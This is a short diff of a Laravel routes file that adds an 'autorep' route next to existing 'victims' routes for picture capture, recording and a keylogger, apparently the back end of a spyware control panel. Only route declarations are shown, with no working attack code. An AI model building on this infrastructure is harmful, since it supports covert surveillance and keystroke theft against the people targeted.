@@ -46,6 +46,7 @@ Route::middleware(['auth'])->group(function () {
     Route::post('picture', [\App\Http\Controllers\VictimsController::class, 'picture'])->name('victims.picture');
     Route::post('record', [\App\Http\Controllers\VictimsController::class, 'record'])->name('victims.record');
     Route::post('keylogger', [\App\Http\Controllers\VictimsController::class, 'keylogger'])->name('victims.keylogger');
+    Route::post('autorep', [\App\Http\Controllers\VictimsController::class, 'autorep'])->name('victims.autorep');
 
 
 
